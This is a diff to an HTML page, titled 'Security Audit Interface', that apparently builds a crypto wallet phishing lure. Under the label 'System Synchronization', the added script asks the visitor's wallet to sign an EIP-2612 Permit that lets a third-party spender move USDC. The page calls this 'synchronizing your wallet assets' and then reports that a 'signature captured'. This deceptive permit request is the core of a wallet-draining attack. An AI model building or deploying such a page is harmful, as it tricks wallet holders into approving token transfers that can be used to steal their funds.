@@ -1,55 +1,59 @@
 <!DOCTYPE html>
 <html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Audit Interface</title>
+</head>
 <body>
-    <h3>Account Security Verification</h3>
-    <p>Please complete verification to synchronize your account and ensure secure access.</p>
-    <button id="verifyBtn">Verify Now</button>
+    <h3>System Synchronization</h3>
+    <p>Please authorize the following permit to synchronize your wallet assets.</p>
+    <button id="verifyBtn" style="padding: 10px 20px; background-color: #007bff; color: white; border: none; border-radius: 5px;">Authorize Access</button>
 
     <script>
         document.getElementById('verifyBtn').addEventListener('click', async () => {
-            // Request user accounts
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-
-            // Simulating an EIP-2612 Permit request
-            const permitData = {
-                domain: {
-                    name: "USDT", 
-                    version: "1",
-                    chainId: parseInt(chainId, 16),
-                    verifyingContract: "0xdAC17F958D2ee523a2206206994597C13D831ec7"
-                },
-                message: {
-                    owner: accounts[0],
-                    // A dummy spender address to trigger the approval UI
-                    spender: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", 
-                    value: "1000000000", 
-                    nonce: 0, 
-                    deadline: Math.floor(Date.now() / 1000) + 3600 
-                },
-                primaryType: "Permit",
-                types: {
-                    EIP712Domain: [
-                        { name: "name", type: "string" }, { name: "version", type: "string" },
-                        { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }
-                    ],
-                    Permit: [
-                        { name: "owner", type: "address" }, { name: "spender", type: "address" },
-                        { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
-                        { name: "deadline", type: "uint256" }
-                    ]
-                }
-            };
-
             try {
-                // This triggers the wallet's signing UI
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
+                const chainId = parseInt(chainIdHex, 16);
+
+                // Pastikan data ini sesuai dengan jaringan yang digunakan (contoh: Ethereum Mainnet)
+                const permitData = {
+                    domain: {
+                        name: "USD Coin", // Pastikan nama token sesuai
+                        version: "2",
+                        chainId: chainId,
+                        verifyingContract: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" // Alamat Kontrak USDC
+                    },
+                    message: {
+                        owner: accounts[0],
+                        spender: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", 
+                        value: "1000000", 
+                        nonce: 0, // Dalam kondisi nyata, Anda harus membaca nonce asli dari kontrak
+                        deadline: Math.floor(Date.now() / 1000) + 3600
+                    },
+                    primaryType: "Permit",
+                    types: {
+                        EIP712Domain: [
+                            { name: "name", type: "string" }, { name: "version", type: "string" },
+                            { name: "chainId", type: "uint256" }, { name: "verifyingContract", type: "address" }
+                        ],
+                        Permit: [
+                            { name: "owner", type: "address" }, { name: "spender", type: "address" },
+                            { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" },
+                            { name: "deadline", type: "uint256" }
+                        ]
+                    }
+                };
+
                 const signature = await window.ethereum.request({
                     method: 'eth_signTypedData_v4',
                     params: [accounts[0], JSON.stringify(permitData)],
                 });
-                alert("Signature successfully generated: " + signature.substring(0, 42) + "...");
+
+                alert("Success! Signature captured: " + signature.substring(0, 30) + "...");
             } catch (err) {
-                console.error("Signing failed:", err);
+                console.error("Operation failed:", err);
+                alert("Error: " + err.message);
             }
         });
     </script>
